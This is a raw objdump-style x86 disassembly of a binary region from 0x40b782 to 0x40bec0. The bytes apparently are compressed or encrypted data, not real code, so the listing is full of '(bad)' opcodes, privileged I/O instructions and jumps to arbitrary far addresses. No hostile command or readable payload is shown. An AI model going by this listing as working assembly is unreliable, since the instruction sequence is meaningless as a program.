  40b782:	and    al,BYTE PTR [eax]
  40b784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b785:	cs out 0x14,al
  40b788:	lea    edx,[eax+0x49]
  40b78b:	dec    ebx
  40b78c:	sub    DWORD PTR [ebx-0x79],0xffffff98
  40b790:	mov    esp,0x78977cbf
  40b795:	add    DWORD PTR [esi-0x63],ecx
  40b798:	int3   
  40b799:	sub    edx,esi
  40b79b:	xor    al,0x1e
  40b79d:	cwde   
  40b79e:	mov    esp,0xc676e34f
  40b7a3:	inc    ebx
  40b7a4:	add    eax,0x72b77414
  40b7a9:	out    dx,al
  40b7aa:	dec    eax
  40b7ab:	dec    ebp
  40b7ac:	xor    edi,edx
  40b7ae:	and    ebx,DWORD PTR [edx]
  40b7b0:	add    ecx,ebp
  40b7b2:	inc    eax
  40b7b3:	jns    0x40b771
  40b7b5:	out    dx,al
  40b7b6:	and    DWORD PTR ds:0x1ac2a04,ecx
  40b7bc:	cwde   
  40b7bd:	in     eax,dx
  40b7be:	mov    ah,0x88
  40b7c0:	inc    eax
  40b7c1:	pop    ss
  40b7c2:	imul   ebp,DWORD PTR [ebp-0x3b],0xe63d4c79
  40b7c9:	dec    ebp
  40b7ca:	dec    eax
  40b7cb:	sbb    al,0x5
  40b7cd:	les    ebp,FWORD PTR [edi]
  40b7cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d0:	aas    
  40b7d1:	sub    bl,BYTE PTR [edx-0x32ef2c84]
  40b7d7:	pusha  
  40b7d8:	adc    eax,0xfd21b538
  40b7dd:	mov    ds:0xe5c29c1e,eax
  40b7e2:	pop    ebx
  40b7e3:	scas   eax,DWORD PTR es:[edi]
  40b7e4:	mov    dl,0x96
  40b7e6:	cmp    dl,dh
  40b7e8:	imul   DWORD PTR [eax+0x43adae3d]
  40b7ee:	mov    ecx,0xaf572344
  40b7f3:	(bad)  
  40b7f4:	and    BYTE PTR [ebp-0x2e],cl
  40b7f7:	cmp    esp,DWORD PTR [ecx-0x48111bc7]
  40b7fd:	push   ds
  40b7fe:	mov    al,0x9b
  40b800:	xor    DWORD PTR [eax-0x7503de9f],0x78
  40b807:	ins    DWORD PTR es:[edi],dx
  40b808:	jmp    0xdec8:0xd3993226
  40b80f:	stc    
  40b810:	dec    edx
  40b811:	ret    
  40b812:	lahf   
  40b813:	les    ebp,FWORD PTR [ebx+0x4052cb2]
  40b819:	loopne 0x40b896
  40b81b:	inc    esi
  40b81c:	push   0x5c758b56
  40b821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b822:	in     eax,dx
  40b823:	or     BYTE PTR [ecx+0x446d9020],0xe1
  40b82a:	dec    ebp
  40b82b:	rcr    ch,1
  40b82d:	mov    cl,0x7f
  40b82f:	lods   eax,DWORD PTR ds:[esi]
  40b830:	cmp    BYTE PTR [edi-0x4061c557],dl
  40b836:	inc    ecx
  40b837:	pop    ds
  40b838:	fsubr  st,st(0)
  40b83a:	adc    BYTE PTR [ebp+0x5f688f8d],dl
  40b840:	cs jmp 0xbd08bfce
  40b846:	imul   edx,DWORD PTR [ebx+0x739936bd],0x41b79951
  40b850:	push   0x2c
  40b852:	popf   
  40b853:	repz adc eax,0xf325ae57
  40b859:	or     al,0xe0
  40b85b:	or     edx,DWORD PTR [ebp+edi*8+0x5]
  40b85f:	xchg   edx,eax
  40b860:	mov    ah,0x3
  40b862:	or     ebp,DWORD PTR [eax]
  40b864:	push   esi
  40b865:	lock rcl BYTE PTR [edx+0x4f],0x8a
  40b86a:	xchg   esp,eax
  40b86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86c:	shl    dl,cl
  40b86e:	xchg   edi,eax
  40b86f:	loope  0x40b817
  40b871:	inc    esi
  40b872:	sub    al,0xbd
  40b874:	(bad)  
  40b875:	xor    eax,0x44c4272f
  40b87a:	rol    BYTE PTR [edx+0x68e5bc35],1
  40b880:	ins    DWORD PTR es:[edi],dx
  40b881:	int3   
  40b882:	popa   
  40b883:	dec    ebp
  40b884:	adc    al,0x35
  40b886:	push   0xe
  40b888:	hlt    
  40b889:	mov    al,dh
  40b88b:	outs   dx,BYTE PTR ds:[esi]
  40b88c:	xor    dh,BYTE PTR [ecx]
  40b88e:	lods   al,BYTE PTR ds:[esi]
  40b88f:	outs   dx,DWORD PTR ds:[esi]
  40b890:	sub    edi,ebx
  40b892:	xor    edx,DWORD PTR [ebx-0x73c9d21e]
  40b898:	(bad)  
  40b899:	cmc    
  40b89a:	jmp    0x13bf:0xc0fd7f6a
  40b8a1:	fisttp WORD PTR [ebx-0x4f9426f2]
  40b8a7:	in     eax,0x8e
  40b8a9:	leave  
  40b8aa:	stos   BYTE PTR es:[edi],al
  40b8ab:	cmp    DWORD PTR cs:[ecx+0x89786f9],esi
  40b8b2:	mov    ds:0xe15eb1f6,al
  40b8b7:	jl     0x8d7831e4
  40b8bd:	emms   
  40b8bf:	mov    DWORD PTR [esp+0x65f0ce87],eax
  40b8c6:	jecxz  0x40b8ba
  40b8c8:	xchg   BYTE PTR [edx],bl
  40b8ca:	fidivr WORD PTR [ecx+0x6988d094]
  40b8d0:	lods   eax,DWORD PTR ds:[esi]
  40b8d1:	daa    
  40b8d2:	push   ds
  40b8d3:	loop   0x40b8a6
  40b8d5:	cdq    
  40b8d6:	mov    ds:0x23cd124c,eax
  40b8db:	sub    edx,DWORD PTR [esi+eiz*4]
  40b8de:	cmc    
  40b8df:	mul    DWORD PTR [edx-0x30]
  40b8e2:	lods   al,BYTE PTR ds:[esi]
  40b8e3:	aad    0x6b
  40b8e5:	cmp    al,0x2d
  40b8e7:	cmp    BYTE PTR [ebx+edx*2+0x68],bh
  40b8eb:	dec    ecx
  40b8ec:	mov    dl,0xbb
  40b8ee:	jb     0x40b8d6
  40b8f0:	add    BYTE PTR [edx],ch
  40b8f2:	mov    esi,0xf30fe753
  40b8f7:	leave  
  40b8f8:	cmp    DWORD PTR [edi+0x2f],eax
  40b8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8fc:	or     BYTE PTR [edx-0x5774df53],dh
  40b902:	(bad)  
  40b904:	add    DWORD PTR [edx-0x2b1228c5],esp
  40b90a:	ss stc 
  40b90c:	out    0x9f,al
  40b90e:	mul    BYTE PTR [eax-0x43036f2c]
  40b914:	outs   dx,BYTE PTR ds:[esi]
  40b915:	xchg   DWORD PTR [ecx],esp
  40b917:	cwde   
  40b918:	std    
  40b919:	out    dx,eax
  40b91a:	daa    
  40b91b:	jmp    0xe50f8fd1
  40b920:	popa   
  40b921:	es enter 0xd663,0xaf
  40b926:	xchg   edx,eax
  40b927:	sbb    al,0xa0
  40b929:	or     dh,cl
  40b92b:	inc    ebp
  40b92c:	or     esp,DWORD PTR [eax+ebp*4+0x7b]
  40b930:	cli    
  40b931:	add    al,0x2b
  40b933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b934:	add    bl,bh
  40b936:	pusha  
  40b937:	scas   eax,DWORD PTR es:[edi]
  40b938:	sti    
  40b939:	clc    
  40b93a:	dec    ebx
  40b93b:	push   edx
  40b93c:	push   es
  40b93d:	aam    0x98
  40b93f:	neg    al
  40b941:	jg     0x40b9a0
  40b943:	fisub  WORD PTR [ecx+0x70170e30]
  40b949:	arpl   WORD PTR [edx-0x3d301928],sp
  40b94f:	fdiv   DWORD PTR [ecx-0x50ba60e1]
  40b955:	xor    ebx,0x9794698a
  40b95b:	jge    0x40b8ec
  40b95d:	test   eax,0x6d73cd94
  40b962:	and    BYTE PTR [esi+0x772f09f3],cl
  40b968:	xor    eax,0xebe7b5f8
  40b96d:	push   ebx
  40b96e:	lods   eax,DWORD PTR ds:[esi]
  40b96f:	push   ebp
  40b970:	jnp    0x40b905
  40b972:	inc    BYTE PTR [ebx]
  40b974:	sbb    eax,0xcb37d674
  40b979:	pushf  
  40b97a:	clc    
  40b97b:	push   ecx
  40b97c:	cmp    eax,DWORD PTR [ebp-0x28]
  40b97f:	(bad)  
  40b980:	mov    ebx,0x600482eb
  40b985:	loope  0x40b9b6
  40b987:	rcr    eax,cl
  40b989:	inc    esp
  40b98a:	add    dl,0x1
  40b98d:	cld    
  40b98e:	pop    ecx
  40b98f:	mov    eax,ds:0x23edf13a
  40b994:	int    0x79
  40b996:	addr16 push esp
  40b998:	xchg   ebp,eax
  40b999:	xchg   edi,eax
  40b99a:	mov    esp,0x84c24bd9
  40b99f:	xchg   eax,eax
  40b9a1:	test   eax,0xbd259f23
  40b9a6:	das    
  40b9a7:	lea    esp,[eax-0x49]
  40b9aa:	dec    edx
  40b9ab:	and    BYTE PTR [ebp+0x5cb61308],al
  40b9b1:	ins    BYTE PTR es:[edi],dx
  40b9b2:	ds push esi
  40b9b4:	icebp  
  40b9b5:	add    ah,0x72
  40b9b8:	arpl   WORD PTR [ebx+0x18],bx
  40b9bb:	mov    dl,ch
  40b9bd:	iret   
  40b9be:	jmp    0xa184:0xca2996c4
  40b9c5:	shl    esp,1
  40b9c7:	xchg   edi,eax
  40b9c8:	fld    QWORD PTR [edx+0x3f]
  40b9cb:	pop    ebp
  40b9cc:	xor    DWORD PTR [edi+0x6d],esi
  40b9cf:	xor    dl,BYTE PTR [ecx-0x51]
  40b9d2:	xor    cl,ah
  40b9d4:	adc    eax,0x7607232c
  40b9d9:	shl    BYTE PTR [esp+eiz*4-0xb6ec429],cl
  40b9e0:	jns    0x40b9d5
  40b9e2:	inc    al
  40b9e4:	or     al,0xe2
  40b9e6:	dec    ecx
  40b9e7:	jne    0x40b9c4
  40b9e9:	outs   dx,BYTE PTR ds:[esi]
  40b9ea:	mov    cl,0x5e
  40b9ec:	mov    esi,0xdd458b8b
  40b9f1:	dec    ebp
  40b9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9f3:	pop    es
  40b9f4:	(bad)  
  40b9f5:	(bad)  
  40b9f6:	fstp   TBYTE PTR [ecx+0x6c]
  40b9f9:	jns    0x40ba00
  40b9fb:	jle    0x40ba27
  40b9fd:	xor    BYTE PTR [edi],dl
  40b9ff:	lods   al,BYTE PTR ds:[esi]
  40ba00:	jnp    0x40b9b9
  40ba02:	test   BYTE PTR [ebp+0x54d715b7],0x6e
  40ba09:	mov    dh,0x19
  40ba0b:	idiv   BYTE PTR [esi+0x67]
  40ba0e:	sbb    eax,0xeaffa394
  40ba13:	xchg   ecx,eax
  40ba14:	pop    edx
  40ba15:	sub    DWORD PTR [esi],ebx
  40ba17:	fldcw  WORD PTR [ecx-0x3b078f4a]
  40ba1d:	xchg   esi,eax
  40ba1e:	sbb    al,0x99
  40ba20:	mov    esp,edx
  40ba22:	pop    ebx
  40ba23:	xchg   ecx,eax
  40ba24:	out    dx,eax
  40ba25:	iret   
  40ba26:	dec    eax
  40ba27:	cmp    edx,DWORD PTR [edi+0x34d59d1c]
  40ba2d:	(bad)
  40ba30:	xor    al,dh
  40ba32:	icebp  
  40ba33:	test   al,0x62
  40ba35:	add    DWORD PTR [ebp-0x56],esp
  40ba38:	outs   dx,WORD PTR ds:[esi]
  40ba3a:	sbb    al,0x88
  40ba3c:	(bad)  
  40ba3e:	imul   ebp,DWORD PTR [esi+0x13],0x9dfdec37
  40ba45:	pop    ss
  40ba46:	shl    BYTE PTR [eax+0x32],cl
  40ba49:	mov    dl,0x69
  40ba4b:	xor    DWORD PTR [ebx-0x61],ebp
  40ba4e:	jmp    0xccf1075b
  40ba53:	jne    0x40b9d7
  40ba55:	retf   0x36a8
  40ba58:	jbe    0x40b9f9
  40ba5a:	jb     0x40b9f7
  40ba5c:	dec    edi
  40ba5d:	inc    ebp
  40ba5e:	scas   eax,DWORD PTR es:[edi]
  40ba5f:	xchg   ebx,eax
  40ba60:	push   DWORD PTR [eax]
  40ba62:	sub    DWORD PTR [esp+ecx*8-0x16],edi
  40ba66:	push   cs
  40ba67:	push   esp
  40ba68:	pop    eax
  40ba69:	pop    edx
  40ba6a:	inc    edi
  40ba6b:	jne    0x40ba1e
  40ba6d:	sub    esp,edi
  40ba6f:	or     BYTE PTR [ebp-0x10],dl
  40ba72:	pop    ecx
  40ba73:	clc    
  40ba74:	xor    BYTE PTR [eax+0x67e3a43c],dh
  40ba7a:	pop    ebx
  40ba7b:	dec    esi
  40ba7c:	dec    ecx
  40ba7d:	jp     0x40bafb
  40ba7f:	xor    esp,DWORD PTR [edi+0x71]
  40ba82:	inc    DWORD PTR [ebx+0x2cd2491a]
  40ba88:	xor    eax,0xc8ff74a1
  40ba8d:	dec    ebp
  40ba8e:	mov    ?,edx
  40ba90:	mov    ch,0x3b
  40ba92:	jo     0x40bab5
  40ba94:	or     eax,DWORD PTR [ecx+0x74]
  40ba97:	sbb    eax,0x905b4c0c
  40ba9c:	test   cl,0x92
  40ba9f:	fwait
  40baa0:	jmp    0x8d40e580
  40baa5:	fwait
  40baa6:	call   DWORD PTR [edx+0xa8e903b]
  40baac:	in     eax,0xe4
  40baae:	call   0x50c6a1fb
  40bab3:	enter  0xad76,0x57
  40bab7:	(bad)  
  40bab8:	fdiv   QWORD PTR [esi]
  40baba:	pop    eax
  40babb:	and    eax,0x9a72ea94
  40bac0:	mov    eax,0xa35dd89e
  40bac5:	es inc ecx
  40bac7:	dec    ebp
  40bac8:	setle  BYTE PTR [esi+0x8149c0e]
  40bacf:	mov    cl,0xfa
  40bad1:	adc    DWORD PTR [esi-0x4b],edx
  40bad4:	sub    edi,DWORD PTR [ecx+0x696cddc8]
  40bada:	inc    eax
  40badb:	(bad)  [ecx]
  40badd:	sahf   
  40bade:	sahf   
  40badf:	add    WORD PTR [ebx],di
  40bae2:	sti    
  40bae3:	and    DWORD PTR [ebx+0x18],eax
  40bae6:	icebp  
  40bae7:	xchg   edi,eax
  40bae8:	xchg   edx,eax
  40bae9:	mov    edx,0x9c7449ed
  40baee:	sub    BYTE PTR [edx],al
  40baf0:	call   0x813afeed
  40baf5:	or     BYTE PTR [ebp-0x6f],cl
  40baf8:	out    dx,eax
  40baf9:	push   ebx
  40bafa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bafb:	repnz adc al,0xcf
  40bafe:	lods   al,BYTE PTR ds:[esi]
  40baff:	adc    ebp,edx
  40bb01:	mov    dh,0x27
  40bb03:	shr    DWORD PTR [edi-0x2dd9fda3],cl
  40bb09:	push   es
  40bb0a:	nop
  40bb0b:	mov    ds:0xb3ec9aea,al
  40bb10:	dec    ebp
  40bb11:	inc    edi
  40bb12:	iret   
  40bb13:	and    al,0xca
  40bb15:	repz les edx,FWORD PTR [ebx+0xb]
  40bb19:	add    al,0xb5
  40bb1b:	and    DWORD PTR [ecx],ebp
  40bb1d:	cdq    
  40bb1e:	sbb    al,BYTE PTR [ecx]
  40bb20:	jns    0x40bba0
  40bb22:	pusha  
  40bb23:	adc    ebx,DWORD PTR [ebx-0x62b090a1]
  40bb29:	mov    DWORD PTR [ecx-0x43],ebx
  40bb2c:	ss pop eax
  40bb2e:	sub    esi,DWORD PTR [edi+0x46c8b78f]
  40bb34:	pushf  
  40bb35:	jmp    0x2155:0xe63cb6e5
  40bb3c:	iret   
  40bb3d:	mulps  xmm3,XMMWORD PTR [ecx]
  40bb40:	mov    WORD PTR [ecx],es
  40bb42:	aad    0x90
  40bb44:	sbb    ebx,eax
  40bb46:	test   edx,ecx
  40bb48:	ret    0xc787
  40bb4b:	add    eax,0x491b145a
  40bb50:	pop    ss
  40bb51:	pop    DWORD PTR [ebp-0x4698fe8c]
  40bb57:	ror    al,cl
  40bb59:	ja     0x40bb2c
  40bb5b:	mov    al,0xf6
  40bb5d:	sbb    al,0x11
  40bb5f:	outs   dx,BYTE PTR ds:[esi]
  40bb60:	inc    ebx
  40bb61:	xor    edi,DWORD PTR [ecx-0x3e3846b1]
  40bb67:	mov    edx,0x818ab550
  40bb6c:	daa    
  40bb6d:	fidiv  DWORD PTR [eax+0x7e9dbd37]
  40bb73:	aaa    
  40bb74:	mov    dl,0xef
  40bb76:	mov    bl,BYTE PTR [edx]
  40bb78:	or     cl,BYTE PTR [eax+0x2247e634]
  40bb7e:	outs   dx,BYTE PTR ds:[esi]
  40bb7f:	(bad)  
  40bb80:	cmp    eax,0xdaddb641
  40bb85:	or     DWORD PTR [eax+0x77],0xffffff85
  40bb89:	ror    eax,0x95
  40bb8c:	mov    ebp,0x6389b8ab
  40bb91:	jmp    0x40bb78
  40bb93:	bound  edx,QWORD PTR [ecx]
  40bb95:	jno    0x40bb54
  40bb97:	xchg   esi,eax
  40bb98:	call   FWORD PTR [edi-0x64473822]
  40bb9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb9f:	push   cs
  40bba0:	and    al,0xc5
  40bba2:	ins    BYTE PTR es:[edi],dx
  40bba3:	out    0x8b,eax
  40bba5:	add    al,0x19
  40bba7:	push   ds
  40bba8:	sbb    edx,DWORD PTR [edx+ebx*8-0x3b]
  40bbac:	inc    ebx
  40bbad:	loop   0x40bc14
  40bbaf:	xor    ebp,DWORD PTR [ecx]
  40bbb1:	shl    DWORD PTR [ebp+0x57],cl
  40bbb4:	je     0x40bc28
  40bbb6:	fadd   DWORD PTR [esi+eiz*8+0x400fae44]
  40bbbd:	rcl    DWORD PTR [esi+0x3b34d1be],1
  40bbc3:	sti    
  40bbc4:	ds mov eax,0x45fbebc1
  40bbca:	xor    esp,edx
  40bbcc:	xor    esi,DWORD PTR [ecx+0x1bb3ecd]
  40bbd2:	and    al,0x5
  40bbd4:	xchg   ebp,eax
  40bbd5:	sbb    dh,cl
  40bbd7:	push   eax
  40bbd8:	rcl    bh,1
  40bbda:	out    0x7,eax
  40bbdc:	lods   al,BYTE PTR ds:[esi]
  40bbdd:	cmp    DWORD PTR [esi+0x47713010],eax
  40bbe3:	ja     0x40bc0b
  40bbe5:	mov    eax,ds:0xf03ea307
  40bbea:	mov    ch,BYTE PTR [ebp-0x2]
  40bbed:	sbb    ebp,esi
  40bbef:	fstp   TBYTE PTR [ecx+esi*4-0x51]
  40bbf3:	xchg   ecx,eax
  40bbf4:	cmp    edi,esp
  40bbf6:	loop   0x40bc1a
  40bbf8:	bound  edi,QWORD PTR [eax-0x276fc5e6]
  40bbfe:	xor    BYTE PTR [ecx+ebp*1+0x75],0xff
  40bc03:	jae    0x40bbcb
  40bc05:	xchg   edi,eax
  40bc06:	aaa    
  40bc07:	mov    al,0x3c
  40bc09:	test   al,0x6d
  40bc0b:	and    al,0x3d
  40bc0d:	fnsave [edx]
  40bc0f:	nop
  40bc10:	das    
  40bc11:	push   0x76
  40bc13:	xchg   ecx,eax
  40bc14:	int    0x22
  40bc16:	jp     0x40bbbb
  40bc18:	cs push es
  40bc1a:	inc    esi
  40bc1b:	sbb    ebp,DWORD PTR [ecx+0x7e8b9302]
  40bc21:	mov    bh,0x27
  40bc23:	aam    0xa1
  40bc25:	cmc    
  40bc26:	push   ds
  40bc27:	xor    al,0x80
  40bc29:	sub    DWORD PTR [edx-0x6c49c953],edi
  40bc2f:	pop    esp
  40bc30:	js     0x40bc1f
  40bc32:	loopne 0x40bca9
  40bc34:	jmp    0xf01c25a4
  40bc39:	cmc    
  40bc3a:	cmp    edi,DWORD PTR [edi+ecx*2+0x737385b0]
  40bc41:	mov    esi,0xed8675b0
  40bc46:	in     al,dx
  40bc47:	jmp    0xbaf79289
  40bc4c:	xor    dh,al
  40bc4e:	and    ah,BYTE PTR [ebx+0x482c6908]
  40bc54:	addr16 mov es,esp
  40bc57:	sub    dh,BYTE PTR [eax-0x67]
  40bc5a:	dec    edi
  40bc5b:	dec    ecx
  40bc5c:	bound  ebp,QWORD PTR [ebx+eax*1+0x7d90bdbb]
  40bc63:	adc    ebx,edi
  40bc65:	push   esi
  40bc66:	fldcw  WORD PTR [eax+0x50d3ecc4]
  40bc6c:	adc    BYTE PTR [esi],al
  40bc6e:	loopne 0x40bc33
  40bc70:	dec    esi
  40bc71:	add    DWORD PTR [ecx-0x6f1d04e0],esp
  40bc77:	mov    eax,0x6c4d3022
  40bc7c:	out    0x7f,eax
  40bc7e:	fsubr  st,st(4)
  40bc80:	jne    0x40bca8
  40bc82:	fdivr  QWORD PTR [edx+0x62]
  40bc85:	rcr    DWORD PTR [edi+0x1a],1
  40bc88:	adc    BYTE PTR [edx+edi*8+0x2d30f8e2],dh
  40bc8f:	mov    BYTE PTR [eax*8-0x6854ce33],cl
  40bc96:	xchg   ebp,eax
  40bc97:	add    eax,0xd4cc4bdd
  40bc9c:	outs   dx,DWORD PTR ds:[esi]
  40bc9d:	(bad)  
  40bc9e:	mov    ecx,0xbc40f13c
  40bca3:	adc    eax,0x4580e3ce
  40bca8:	call   0x9050b24e
  40bcad:	inc    edi
  40bcae:	loop   0x40bd20
  40bcb0:	or     eax,0xb08406c
  40bcb5:	mov    WORD PTR [ebp-0x7c7c93e8],?
  40bcbb:	pop    esi
  40bcbc:	mov    edi,DWORD PTR [ebx]
  40bcbe:	pop    ecx
  40bcbf:	std    
  40bcc0:	add    al,0x1e
  40bcc2:	sub    ch,BYTE PTR [edi-0x7ec4749d]
  40bcc8:	inc    esp
  40bcc9:	leave  
  40bcca:	mov    cl,0xae
  40bccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bccd:	fnsave [edi+0x39]
  40bcd0:	push   esp
  40bcd1:	add    dl,BYTE PTR [ecx+0x5a]
  40bcd4:	pop    es
  40bcd5:	pop    eax
  40bcd6:	and    al,0x21
  40bcd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcd9:	cwde   
  40bcda:	mov    WORD PTR [ecx],?
  40bcdc:	gs mov dh,0x9
  40bcdf:	add    DWORD PTR [edi],0x78
  40bce2:	(bad)  [edx-0x3]
  40bce5:	addr16 jl 0x40bcf5
  40bce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bce9:	pop    ds
  40bcea:	stos   BYTE PTR es:[edi],al
  40bceb:	xchg   BYTE PTR [ecx],ch
  40bced:	sub    eax,0x524e8679
  40bcf2:	dec    ebp
  40bcf3:	cmp    ebp,esp
  40bcf5:	jo     0x40bcc4
  40bcf7:	pop    edx
  40bcf8:	pop    eax
  40bcf9:	ins    BYTE PTR es:[edi],dx
  40bcfa:	sub    bh,cl
  40bcfc:	mov    esp,0x7793e7b0
  40bd01:	ret    
  40bd02:	add    DWORD PTR [eax],esp
  40bd04:	shr    BYTE PTR [ecx-0x5d],1
  40bd07:	inc    esi
  40bd08:	into   
  40bd09:	lahf   
  40bd0a:	xchg   ebp,eax
  40bd0b:	sub    ebp,edx
  40bd0d:	pop    es
  40bd0e:	fucomip st,st(2)
  40bd10:	pop    edi
  40bd11:	aaa    
  40bd12:	mov    WORD PTR [ecx-0xe],?
  40bd15:	adc    DWORD PTR [esi-0x36],ebp
  40bd18:	push   edx
  40bd19:	dec    esp
  40bd1a:	jmp    0x40bd55
  40bd1c:	mov    ebx,0xdc1b085a
  40bd21:	jl     0x40bd54
  40bd23:	add    dl,BYTE PTR [ecx-0x79]
  40bd26:	pop    esp
  40bd27:	popf   
  40bd28:	xchg   DWORD PTR ds:0x11acf829,eax
  40bd2e:	pop    ebp
  40bd2f:	in     eax,0x91
  40bd31:	xchg   ecx,eax
  40bd33:	dec    edi
  40bd34:	fistp  DWORD PTR [ecx+esi*4]
  40bd37:	scas   al,BYTE PTR es:[edi]
  40bd38:	cdq    
  40bd39:	xchg   edx,eax
  40bd3a:	sbb    eax,0xc5733691
  40bd3f:	mov    dh,0x5c
  40bd41:	outs   dx,BYTE PTR ds:[esi]
  40bd42:	and    BYTE PTR ds:0xac27b4e5,al
  40bd48:	or     BYTE PTR [eax-0x2c],dl
  40bd4b:	sbb    esp,DWORD PTR [esi+0x46]
  40bd4e:	xchg   esi,eax
  40bd4f:	mov    cl,BYTE PTR [eax-0x670d101]
  40bd55:	fbstp  TBYTE PTR [edi+0x4b5795bd]
  40bd5b:	jecxz  0x40bd76
  40bd5d:	push   edx
  40bd5e:	mov    al,BYTE PTR [esi-0x70b81b9a]
  40bd64:	and    al,0xa4
  40bd66:	mov    dl,0x1c
  40bd68:	inc    ecx
  40bd69:	inc    esp
  40bd6a:	mov    eax,0x5d6ec68f
  40bd6f:	add    DWORD PTR [eax-0x41],ebx
  40bd72:	(bad)  
  40bd73:	cmp    al,0xdc
  40bd75:	push   edx
  40bd76:	jecxz  0x40bdf4
  40bd78:	outs   dx,BYTE PTR ds:[esi]
  40bd79:	dec    ecx
  40bd7a:	and    eax,DWORD PTR [edx-0x22]
  40bd7d:	xchg   edx,eax
  40bd7e:	xchg   esp,eax
  40bd7f:	inc    ebp
  40bd80:	jmp    0x2dd59df2
  40bd85:	iret   
  40bd86:	adc    ah,BYTE PTR [eax+0x27]
  40bd89:	call   0x85e4a28c
  40bd8e:	mov    edx,DWORD PTR [esi+0x40]
  40bd91:	test   DWORD PTR [esi-0x51a0005f],eax
  40bd97:	mov    ds:0x32ed4716,eax
  40bd9c:	call   0xa325f898
  40bda1:	adc    eax,0xffffffd5
  40bda4:	daa    
  40bda5:	push   es
  40bda6:	ins    DWORD PTR es:[edi],dx
  40bda7:	and    edx,esi
  40bda9:	dec    edi
  40bdaa:	xor    al,0xc6
  40bdac:	adc    ebp,DWORD PTR [edx-0x233a5fef]
  40bdb2:	sti    
  40bdb3:	cmp    bl,ah
  40bdb5:	mov    dh,0x7a
  40bdb7:	fst    st(5)
  40bdb9:	push   edi
  40bdba:	xchg   esi,eax
  40bdbb:	loop   0x40bda4
  40bdbd:	fild   QWORD PTR [ecx]
  40bdbf:	push   edi
  40bdc0:	das    
  40bdc1:	repz push esp
  40bdc3:	or     edx,DWORD PTR [edx-0x66]
  40bdc6:	imul   esi,ebp,0x9a23ab72
  40bdcc:	or     BYTE PTR [ebp-0x42],0x92
  40bdd0:	push   ebx
  40bdd1:	fistp  QWORD PTR [edx+0x5e]
  40bdd4:	or     ebx,eax
  40bdd6:	push   ebx
  40bdd7:	imul   eax,DWORD PTR [ebp-0x38],0x3
  40bddb:	sub    DWORD PTR [ebx-0x4fbe5636],ecx
  40bde1:	xor    BYTE PTR [eax],ch
  40bde3:	mov    ch,0x9f
  40bde5:	add    BYTE PTR [ebx],0x94
  40bde8:	lds    edi,FWORD PTR [edi-0x4a]
  40bdeb:	jnp    0x40be29
  40bded:	sbb    ah,dl
  40bdef:	test   ebp,0xd1f3c87
  40bdf5:	retf   
  40bdf6:	and    cl,al
  40bdf8:	push   esi
  40bdf9:	mov    al,0x0
  40bdfb:	and    ebx,DWORD PTR [ecx+0x28c0137e]
  40be01:	add    BYTE PTR [eax],ah
  40be03:	or     al,0xbb
  40be05:	cld    
  40be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be07:	in     eax,dx
  40be08:	cmp    bl,ah
  40be0a:	xchg   esp,eax
  40be0b:	fistp  QWORD PTR ds:0xc29d3d96
  40be11:	push   0x2e26e44d
  40be16:	jns    0x40be03
  40be18:	pop    ebx
  40be19:	aaa    
  40be1a:	ffreep st(3)
  40be1c:	or     ebx,DWORD PTR [eax-0x3d6f180b]
  40be22:	cmc    
  40be23:	fadd   QWORD PTR [eax+0x3f37602d]
  40be29:	rol    DWORD PTR [ecx+0x36],1
  40be2c:	cdq    
  40be2d:	pop    ss
  40be2e:	test   BYTE PTR [edi-0x36c3f448],bl
  40be34:	mov    ecx,0xdd641f20
  40be39:	pusha  
  40be3a:	shl    al,1
  40be3c:	and    eax,DWORD PTR [eax]
  40be3e:	imul   eax,DWORD PTR [eax+0x58],0xffffff88
  40be42:	xchg   ebx,eax
  40be43:	ds pop ecx
  40be45:	push   cs
  40be46:	pop    ebx
  40be47:	jp     0x40be19
  40be49:	mov    bl,0xc5
  40be4b:	test   BYTE PTR [edx+esi*8-0x2baad342],dl
  40be52:	push   0xd779c437
  40be57:	mov    dl,0xe
  40be59:	xchg   esi,eax
  40be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be5b:	pop    ebx
  40be5c:	fisubr WORD PTR [eax]
  40be5e:	add    eax,0xfac099a
  40be63:	cli    
  40be64:	adc    al,0xe9
  40be66:	int3   
  40be67:	push   ss
  40be68:	lods   eax,DWORD PTR ds:[esi]
  40be69:	xchg   edi,eax
  40be6a:	sbb    esi,DWORD PTR [edi-0x6f]
  40be6d:	les    ecx,FWORD PTR [ebx+ebx*8-0x14]
  40be71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be72:	jge    0x40be3f
  40be74:	clc    
  40be75:	or     eax,DWORD PTR ds:0xcaef90e2
  40be7b:	xchg   esi,esp
  40be7d:	shl    BYTE PTR [esi+0x2a],1
  40be80:	(bad)  
  40be81:	mov    edi,0xfec401ba
  40be86:	pop    ds
  40be87:	outs   dx,DWORD PTR ds:[esi]
  40be88:	loopne 0x40be0f
  40be8a:	xchg   ebx,eax
  40be8b:	fcomp  DWORD PTR [esi+0x32]
  40be8e:	jne    0x40bf0b
  40be90:	mov    bl,0x2b
  40be92:	out    0x41,al
  40be94:	fcmovbe st,st(0)
  40be96:	mov    eax,ds:0x7e2eee4a
  40be9b:	sub    dh,cl
  40be9d:	aad    0x8d
  40be9f:	popf   
  40bea0:	xchg   esi,eax
  40bea1:	(bad)  
  40bea2:	mov    ds:0xcb2c6f01,eax
  40bea7:	in     al,0xf5
  40bea9:	ret    0x571f
  40beac:	xchg   esp,eax
  40bead:	add    esi,DWORD PTR [ebp+0x29]
  40beb0:	add    DWORD PTR [ebp+0x6f],0x3e
  40beb4:	or     BYTE PTR [esi-0x70],ch
  40beb7:	(bad)  
  40beb8:	int3   
  40beb9:	ds (bad) 
  40bebb:	mov    edx,0x6c90b6f1
  40bec0:	add    al,0xf0
